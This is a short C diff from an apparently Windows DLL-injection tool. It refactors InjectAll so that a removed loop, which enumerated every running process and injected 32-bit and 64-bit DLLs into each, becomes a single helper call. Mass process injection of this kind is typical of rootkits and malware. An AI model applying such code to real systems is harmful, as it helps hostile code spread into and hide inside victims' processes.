@@ -104,25 +104,7 @@ BOOL Inject(DWORD processId, LPBYTE dll, DWORD dllSize)
 }
 BOOL InjectAll(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size)
 {
-	BOOL result = FALSE;
-
-	LPDWORD processes = NEW_ARRAY(DWORD, 10000);
-	DWORD processCount = 0;
-	if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
-	{
-		processCount /= sizeof(DWORD);
-
-		for (DWORD i = 0; i < processCount; i++)
-		{
-			InjectDll(processes[i], dll32, dll32Size);
-			InjectDll(processes[i], dll64, dll64Size);
-		}
-
-		result = TRUE;
-	}
-
-	FREE(processes);
-	return result;
+	return InjectAllProcesses(dll32, dll32Size, dll64, dll64Size);
 }
 BOOL Detach(DWORD processId)
 {
